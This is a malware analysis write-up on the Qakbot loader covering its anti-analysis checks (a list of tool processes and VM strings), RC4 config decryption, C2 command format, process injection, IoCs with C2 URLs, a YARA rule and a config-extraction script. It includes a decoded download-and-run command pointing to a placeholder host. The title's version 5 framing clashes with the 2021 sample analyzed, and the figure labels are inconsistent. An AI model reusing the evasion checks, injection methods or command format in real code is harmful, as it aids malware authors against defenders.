---
title: "Qakbot v5"
classes: wide
header:
  teaser: /assets/images/malware-analysis/qakbot/thumbnail.png
ribbon: DodgerBlue
description: "Dissecting qakbot the famous malware loader. qakbot is currently in the wild sneaking into organizations using phishing campaign ..."
categories:
  - Malware Analysis
toc: true
---
# Meet Qakbot 

QakBot, also recognized as QBot, QuackBot, and Pinkslipbot, has been operational for years, initially as a financial malware targeting governments and businesses for financial fraud by pilfering user credentials and keystrokes . 

Over time, it has evolved into a malware dropper, spreading sensitive information to other network systems. 

The threat group has recently updated their codebase to support 64-bit versions of Windows, enhanced encryption algorithms, and added further obfuscation techniques.

With the release of Qakbot version 5.0, the string encryption algorithm underwent a significant change. While strings are still encrypted using a simple XOR key, the key is no longer hardcoded in the data section. Instead, it is encrypted with AES.



# Anti Analysis
## check for sandbox / analysis enviroment
Qbot tries to retrieve the attributes of a directory named C:\INTERNAL\__empty using the GetFileAttributesW function. If the directory exists, it could imply that the environment is being used for analysis(like a virtual machine or sandbox setup).


[![](/assets/images/malware-analysis/qakbot/anti_sandbox.png)](/assets/images/malware-analysis/qakbot/anti_sandbox.png)
<center><font size="3"><u>Figure</u>(3): <u>anti analysis 1</u></font> </center> 
<br>

## Check for analysis tools . 

Qakbot checks the processes running on a system and compares them with names associated with analysis tools to avoid detection.

[![](/assets/images/malware-analysis/qakbot/anti_analysis_1.png)](/assets/images/malware-analysis/qakbot/anti_analysis_1.png)
<center><font size="3"><u>Figure</u>(3): <u>qakbot search for tool's process</u></font> </center> 
<br>

**full processes list**
<details style="color: #EEFFFF; font-family: monospace !default; font-size: 0.85em; background: #263238; border: 1px solid #263238; border-radius: 3px; padding: 10px; line-height: 1.8">
    <summary style="outline: none; cursor: pointer">
        <span style="color: darkgray">
            Expand to see more
        </span><br>
        &emsp; wireshark.exe<br>
        &emsp; filemon.exe<br>
        &emsp; procmon.exe<br>
        &emsp; idaq64.exe<br>
        &emsp; tcpview.exe<br>
    </summary>
    &emsp; frida-winjector-helper-32.exe<br>
    &emsp; frida-winjector-helper-64.exe<br>
    &emsp; tcpdump.exe<br>
    &emsp; windump.exe<br>
    &emsp; ethereal.exe<br>   
    &emsp; ettercap.exe<br>
    &emsp; rtsniff.exe<br>
    &emsp; packetcapture.exe<br>
    &emsp; capturenet.exe<br>
    &emsp; qak_proxy<br>
    &emsp; dumpcap.exe<br>
    &emsp; CFF Explorer.exe<br>
    &emsp; not_rundll32.exe<br>
    &emsp; ProcessHacker.exe<br>
    &emsp; loaddll32.exe<br>
    &emsp; PETools.exe<br>
    &emsp; ImportREC.exe<br>
    &emsp; LordPE.exe<br>
    &emsp; SysInspector.exe<br>
    &emsp; proc_analyzer.exe<br>
    &emsp; sysAnalyzer.exe<br>
    &emsp; sniff_hit.exe<br>
    &emsp; joeboxcontrol.exe<br>
    &emsp; joeboxserver.exe<br>
    &emsp; ResourceHacker.exe<br>
    &emsp; x64dbg.exe<br>
    &emsp; Fiddler.exe<br>
    &emsp; sniff_hit.exe<br>
    &emsp; sysAnalyzer.exe<br>
    &emsp; BehaviorDumper.exe<br>
    &emsp; processdumperx64.exe<br>
    &emsp; anti-virus.EXE<br>
    &emsp; sysinfoX64.exe<br>
    &emsp; sctoolswrapper.exe<br>
    &emsp; sysinfoX64.exe<br>
    &emsp; FakeExplorer.exe<br>
    &emsp; apimonitor-x86.exe<br>
    &emsp; idaq.exe<br>
    &emsp; dumper64.exe<br>
    &emsp; user_imitator.exe<br>
    &emsp; Velociraptor.exe<br>
</details>

## Anti VM
Qakbot exploits Windows Management Instrumentation (WMI), a system management technology utilized to administer remote systems and provide comprehensive data about the operating system, hardware, and installed software and applications on a computer. 

- It use WMI queries to gather system information, including details about virtualization. It queries classes such as **Win32_ComputerSystem**, **Win32_Bios**, **Win32_DiskDrive**, or **Win32_PhysicalMemory**, then check for patterns indicative of virtualized environments. These patterns include known manufacturer or model strings associated with virtualization platforms. 

Below are the classes and their corresponding checked values : 

| Class                | Checked Values                                                |
|----------------------|---------------------------------------------------------------|
| Win32_ComputerSystem | MS_VM_CERT, VMware, Virtual Machine                           |
| Win32_Bios           | VRTUAL, VMware, VMW, Xen                                      |
| Win32_DiskDrive      | VMware, PROD_VIRTUAL_DISK, VIRTUAL-DISK, XENSRC, 20202020     |
| Win32_PhysicalMemory | VMware, VMW, QEMU                                             |
| Win32_PnPEntity      | QEMU, VMware Pointing, VMware Accelerated, VMware SCSI,..     |



Qakbot also searches for 'vmnat', a process initiated by VMware upon startup. 'vmnat' manages communication in the Network Address Translation (NAT) setup with the guest machine 





[![](/assets/images/malware-analysis/qakbot/entry.png)](/assets/images/malware-analysis/qakbot/vmi_query.png)
<center><font size="3"><u>Figure</u>(1): <u>How qakbot can sneak into your environment to download additional malwares.</u></font> </center> 
<br>
qakbot DLL is embedded within malicious documents delivered by phishing e-mails . The method that the malicious document uses to achieve execution is usually a VBA macro that is executed when the document is opened. Being dropped by the doc file, the initial packed DLL is an intermediate stage responsible for unpacking and exposing the true functionality of qakbot. Based on the collected information about the victim host, it will decide which malware to deploy. qakbot will then proceed to perform the loading functionality in order to infect the system with the actual malicious content.



# Technical Summary

1. **Configuration Extraction:** qakbot comes with embedded <u>RC4</u> encrypted configuration with hard-coded key. It uses the Microsoft Windows `CryptoAPI` to do the decryption. These configuration contains the C2 which it will communicate with for further commands. 
2. **Host Profiling:** qakbot will gather information about the host in order to decide which malicious payload will be downloaded as well as to generate a unique victim ID. For instance, if the host is connected to an active directory domain, <u>Cobalt Strike</u> conditions are met. Collected information contains: OS version, IP address, Domains trusts, Computer name & username.
3. **C2 Communication:** The victim profile will be forwarded to the C2 to decide further orders. The returned C2 command is base64 encoded with additional layer of single-byte XOR encryption. The command defines a set of 5 available loading techniques to be performed + a new URL to download the additional malware to be loaded and executed.
4. **Payload Download:** There are a lot of options to be selected. For example, qakbot can download fully grown malicious EXE or DLL files, or even tightly crafted <u>shellcodes</u>. There is high degree of flexibility here that can serve a lot of threat actors which makes qakbot a great choice.
5. **Malicious Code Execution:** Whether it's <u>process injection</u> or simply to drop on disk and execute the malware, qakbot is capable of performing the complex operation to ensure running that the malicious code on the victim's machine.



# Technical Analysis 

## First look & Unpacking

[![](/assets/images/malware-analysis/qakbot/virus_total.png)](/assets/images/malware-analysis/qakbot/virus_total.png)
<center><font size="3"> <u>Figure</u>(2): <u>Results are at 2021-08-26 14:38:31 UTC. Different results may appear. </u> </font></center> 
<br>
Catching the initial dropped DLL by the malicious document and inspecting it, it is first seen at **2021-08-26 14:38:31 UTC** according to [VirusTotal](https://www.virustotal.com/gui/file/efbdd00df327459c9db2ffc79b2408f7f3c60e8ba5f8c5ffd0debaff986863a8/detection/f-efbdd00df327459c9db2ffc79b2408f7f3c60e8ba5f8c5ffd0debaff986863a8-1629989820).
At the given date, the file sample was flagged as malicious by only 6 security vendors.

[![](/assets/images/malware-analysis/qakbot/unpacking.png)](/assets/images/malware-analysis/qakbot/unpacking.png)
<center> <font size="3"><u>Figure</u> (3): <u>Before & After view of the memory dump.</u> </font></center> 
<br>
To unpack the dropped DLL, we use **X64dbg** to set a breakpoint on `VirtualAlloc` API. After writing new data into the allocated memory space, we set a hardware breakpoint on execution there. We continue single stepping into the rest of the unpacking stub to assure the building of the import table. Then, we can spot a successfully unpacked PE header as well as many resolved strings in the newly allocated memory space. Finally, we dump the memory section into disk. 



## Anti Analysis

QakBot uses a Windows API Hashing (Dynamic API Resolution) to avoid detection. It dynamically loads its Import Address Table (IAT) using a CRC32 Hashing Algorithm with a hardcore xor key.

[![](/assets/images/malware-analysis/qakbot/host_profiling.png)](/assets/images/malware-analysis/qakbot/host_profiling.png)
<center> <font size="3"><u>Figure</u> (4): <u>All functions were labeled after RE</u>. </font></center> 
<br>
Using **IDA Pro** we can see that unpacked qakbot DLL has two exports which lead to the same function. From there our static code analysis will begin.  The malware functionality begins with host profiling. Collected information contains: OS version, Victim's IP address, Domains names & DNS names, Computer name, username, and whether the machine is x64 or x86.

[![](/assets/images/malware-analysis/qakbot/unique_ID.png)](/assets/images/malware-analysis/qakbot/unique_ID.png)
<center><font size="3"> <u>Figure</u>(5): <u>The malware uses</u> GetAdaptersAddresses <u>to obtain the required info.</u></font> </center>
<br>
It creates a unique ID for the victim using its MAC addresses of all the connected adapters XORed with the Windows directory volume serial number.

[![](/assets/images/malware-analysis/qakbot/concatinating_profile.png)](/assets/images/malware-analysis/qakbot/concatinating_profile.png)
<center><font size="3"> <u>Figure(</u>6): check_if_x64 <u>routine is used to determine if the victim machine is x64 or not.</u> </font></center> 
<br>
Then, it concatenates the final string which will hold the collected host information to be sent to the C&C server. The call to `mw_wrap_config_decryption` routine will be discussed in details in a few lines. It's used to extract the embedded configuration which will also be used in the final host profile. Something that can be very useful while  **YARA rules** is the format string `{"GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d"}` which makes a good *indicator* for qakbot . These collected characteristics about the infected host will decide which malware will be deployed. For instance, if the host is connected to an active directory domain, **Cobalt Strike** malware will be downloaded and executed.



## Configuration Extraction

[![](/assets/images/malware-analysis/qakbot/enc_config_dump.png)](/assets/images/malware-analysis/qakbot/enc_config_dump.png)
<center> <font size="3"><u>Figure</u>(7): <u>Hexadecimal representation of the data residing at the .data section.</u> </font></center> 
<br>
But before finishing the host profile, the malware decrypts the embedded configuration in order to send a copy to the C&C server. The decryption routine references two global data variables very close the beginning of the .*data section*. From the way the parameters are arranged for the decryption routine, I've concluded that the 8 bytes beginning at `0x5A5010` are the decryption key followed by the encrypted configuration.  

[![](/assets/images/malware-analysis/qakbot/config_decryption.png)](/assets/images/malware-analysis/qakbot/config_decryption.png)
<center><font size="3"> <u>Figure</u>(8): <u>You can use the MSDN documentation for more information about the APIs.</u></font> </center> 
<br>
qakbot comes with embedded **RC4** encrypted configuration with hard-coded key. It uses the Microsoft Windows `CryptoAPI`to do the decryption. First, the key will be **SHA-1** hashed before attempting the decryption. Then only the **first 5 bytes** of the hashed key will be used to decrypt the encrypted data.

The upper 16 bits of the 4th parameter denotes the size of the RC4 decryption key. Here it's `0x280011 = 0000000000101000 -- 0000000000010001` 
in which `101000 = 40 bits or 5 bytes`.

[![](/assets/images/malware-analysis/qakbot/cyberchef_data.png)](/assets/images/malware-analysis/qakbot/cyberchef_data.png)
<center><font size="3"> <u>Figure</u>(9): <u>Screen-shot from the actual decrypted configuration the malware uses.</u></font> </center>
<br>
We can use [CyberChef](https://gchq.github.io/CyberChef/) to simulate the decryption process statically. First, the 8 bytes key `{f0da08fe225d0a8f}` will be `SHA-1 hashed = {67f6c6259f8f4ef06797bbd25edc128fd64e6ad7}`. Then, the first 5 bytes of the key will be used as the final RC4 decryption key for decrypting the configuration data. These configuration contains the C2 which it will communicate with for further commands based on the collected host profile. Here at the bottom right corner, we can see that the malware comes with 3 C&C servers to try to connect with. At the end of this report, we will use another way to automatically extract the embedded configuration using Python. 



## C&C Communication

[![](/assets/images/malware-analysis/qakbot/c2_communication.png)](/assets/images/malware-analysis/qakbot/c2_communication.png)
<center> <font size="3"><u>Figure</u>(10): <u>The malware checks for 200 OK response before retrieving the C2 commands.</u></font> </center>
<br>
qakbot extracts the C2 URLs and initializes the connection with the remote end using the high level `Wininet.dll` library APIs. It uses the following hard-coded User-Agent `{"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko"}` which is very common.

First, the collected host profile is sent using HTTP POST request. Secondly, it accepts the matched C2 command based on the gathered information about the victim. The received C2 command is **base64** encoded and **XOR** encrypted with a single-byte key `0x7A`. The malware performs the necessary decoding before interpreting the command.

The command consists of 4 parts:
1.  A character from the set `{'b','e','l','n','r'}` to specify what action to be performed.
2. The colon character `:` as delimiter.
3. **URL** of the malicious content to be downloaded. 		
4. The bar character `|` as delimiter.

```sh
# i.e decoded command

 X:http://badsite.com/malware.exe|

```


## Executing C2 Commands

[![](/assets/images/malware-analysis/qakbot/c2_commands.png)](/assets/images/malware-analysis/qakbot/c2_commands.png)
<center><font size="3"><u>Figure</u>(11): <u>Conditional code flows depending on the 1st character of the C2 command.</u> </font></center>
<br>
After retrieving the C2 command and performing the appropriate decoding, the command is validated and then passed to the routing in which it will download and execute the malicious content. The malicious content will be downloaded using the URL at offset 3 from the beginning of the C2 string. Then, based on the first character of the C2 command, one of the switch case branches will be executed.

There are 5 available options or executions paths. Excluding the `n` command because it simply acts as a `NOP` operation, so we have 4 valid options.


### The 'b' Command

This execution branch will perform a process injection in a **newly** created `svchost.exe`process with `CREATE_SUSPENDED` flag. The injected malicious code is first checked to be a valid PE file -DLL or EXE- in order to be injected. For the new suspended `svchost.exe` process, the injection is done in a classic way using the APIs: `VirtualAllocEx` and `WriteProcessMemory`. What is more interesting here is the way the malware sets the new Entry point for the malicious code.

[![](/assets/images/malware-analysis/qakbot/change_OEP.png)](/assets/images/malware-analysis/qakbot/change_OEP.png)
<center> <font size="3"><u>Figure</u>(12): <u>A thread context is a snapshot of processor-specific register data.</u></font> </center>
<br>
It changes the value of the `EAX` register and sets the new thread context overwriting the old one. The `EAX` register in a newly created thread will always point to the **OEP**. This effectively transfers the entry point of the newly created `svchost.exe` process to the start of the injected malicious binary. 


### The 'e' Command

[![](/assets/images/malware-analysis/qakbot/create_Thread_option.png)](/assets/images/malware-analysis/qakbot/create_Thread_option.png)
<center> <font size="3"><u>Figure</u>(13): lpStartAddress <u>parameter is a wrapper function which calls the OEP of the binary.</u> </font></center>
<br>
The difference between this execution branch and the previous one is that this performs execution of the malicious binary inside the currently running process without touching `svchost.exe`. First, qakbot will perform PE header parsing to find the `ImageBase` and `AddressOfEntryPoint` fields.

Then, it will proceed to build the import table which will be used by the injected binary. It uses `LoadLibraryA`and `GetProcAddress` to do the job. That's because the newly created thread will crash if it's found to have dependencies problems. At last, based on function flags, the malware will decide to launch the newly downloaded malicious in a new separate thread or simply just to call it as a function.


### The 'l' Command

[![](/assets/images/malware-analysis/qakbot/inject_shellcode.png)](/assets/images/malware-analysis/qakbot/inject_shellcode.png)
<center><font size="3"><u>Figure</u>(14): <u>The functions flags are:</u> arg_inject_svchost <u>and</u> arg_create_new_thread <u>which decide the injection.</u> </font></center>
<br>
Here the malware doesn't check for valid PE file because it's supposed to inject a **shellcode**. Based on the function's flags, qakbot will decide which to inject a newly created `svchost.exe` or to call the malicious shellcode as a function in the currently running process.

The malware doesn't need to resume the suspended process because its only suspends the main thread. The malware is creating another thread within `svchost.exe` to execute the malicious shellcode.


### The 'r' Command

[![](/assets/images/malware-analysis/qakbot/drop_binary.png)](/assets/images/malware-analysis/qakbot/drop_binary.png)
<center> <font size="3"><u>Figure</u>(15): %TEMP% <u>directory is used to store ephemeral temporary files.</u></font> </center>
<br>
This execution path is the only one that actually **drops** files on the disk. qakbot will drop the newly downloaded malicious binary in the `%TEMP%` directory with a random name beginning with the "**BN**" prefix. Then, if it's an EXE file, it will simply execute it in a new process. If it's a DLL file, it will use `run32dll.exe`to execute the malicious DLL.


<br>
# Conclusion

qakbot is considered a straightforward loader but very efficient at the same time. So far, qakbot has targeted companies of all sizes and in a wide variety of industries and countries to deploy very serious malwares like **FickerStealer**, **Sendsafe**, and **Cobalt Strike** or even **Cuba Ransomware**. It's a must to take the appropriate countermeasures to defend your organization from such dreadful threat. We can't be sure which threat actors will also use qakbot as their loader in the future. Yet, one thing is sure: as effective as it has been to date, the threat posed by qakbot will not fade away in the coming future.


<br>
# IoCs

| No.  | Description             | Hash                                                         |
| :--- | ----------------------- | ------------------------------------------------------------ |
| 1    | The initial dropped DLL | EFBDD00DF327459C9DB2FFC79B2408F7F3C60E8BA5F8C5FFD0DEBAFF986863A8 |
| 2    | The unpacked DLL        | 5E74015E439AE6AA7E0A29F26EF2389663EB769D25ABCEB636D8272A74F27B7F |
| 4    | qakbot C&C Server 1   | http://intakinger.com/8/forum.php                            |
| 5    | qakbot C&C Server 2   | http://idgentexpliet.ru/8/forum.php                          |
| 6    | qakbot C&C Server 3   | http://declassivan.ru/8/forum.php                            |


<br>
# YARA Rule

```css
rule qakbot : loader
{
	meta:
		description = "This is a noob rule for detecting unpacked qakbot DLL"
		author = "Nidal Fikri @cyber_anubis"
		
	strings:
		$mz = {4D 5A} //PE File
	
		$s1 = "http://api.ipify.org" ascii fullword
		$s2 = /GUID=%I64u&BUILD=%s&INFO=%s(&EXT=%s)?&IP=%s&TYPE=1&WIN=%d\.%d\(x64\)/ ascii fullword
		$s3 = /GUID=%I64u&BUILD=%s&INFO=%s(&EXT=%s)?&IP=%s&TYPE=1&WIN=%d\.%d\(x32\)/ ascii fullword
		$s4 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" ascii fullword

	condition:
		(filesize < 500KB) and ($mz at 0) and (3 of ($s*))
}
```

<br>
# Python Automated Configuration Extraction 

This python script is used to automatically extract the configuration of the qakbot malware. Steps required are as follows:

- Open the binary file.
- Get the .data section.
- Extract the the key and the encrypted configuration data at offset 16.
- SHA-1 hash the extracted key to get the final key.
- Use the key to decrypt the configurations.

```python
import pefile           #To manipulate PE files
import hashlib          #To perform the SHA-1 hashing
import binascii         #To perfrom unhexing
import arc4             #To perform the RC4 decryption

#This functions creates a PE object. Then iterates over the sections to locate
#the .data section in order to return its content
def Get_Date_Section(file):
    pe_file = pefile.PE(file)
    for section in pe_file.sections:
        if b".data" in section.Name:
            return section.get_data()

def rc4_decryption(key, encrypted_data):
    cipher = arc4.ARC4(key)
    decrypted_content = cipher.decrypt(encrypted_data)
    extracted_config = decrypted_content[:200]
    print(extracted_config.decode('utf-8')) #Prints in Unicode

def main():
    file_path = input("Pls enter the file path: ")
    data_section = Get_Date_Section(file_path)
    #The config data begins at offset 16 inside the .data section
    full_configuration = data_section[16:]

    #The key is the first 8 bytes while the encrypted data is the rest
    key = full_configuration[0:8]
    data = full_configuration[8:]

    #The RC4 key is only the first 5 bytes = 10 hex digits
    hashed_key = hashlib.sha1(key).hexdigest()
    rc4_key = hashed_key[0:10]

    rc4_decryption(binascii.unhexlify(rc4_key),data)


if __name__ == '__main__':
    main()
```


# Refrences

- [https://www.binarydefense.com/analysis-of-qakbot-when-boring-begets-beacon](https://www.binarydefense.com/analysis-of-qakbot-when-boring-begets-beacon)
- [https://elis531989.medium.com/dissecting-and-automating-qakbots-config-extraction-1a6ed85d99b8](https://elis531989.medium.com/dissecting-and-automating-qakbots-config-extraction-1a6ed85d99b8)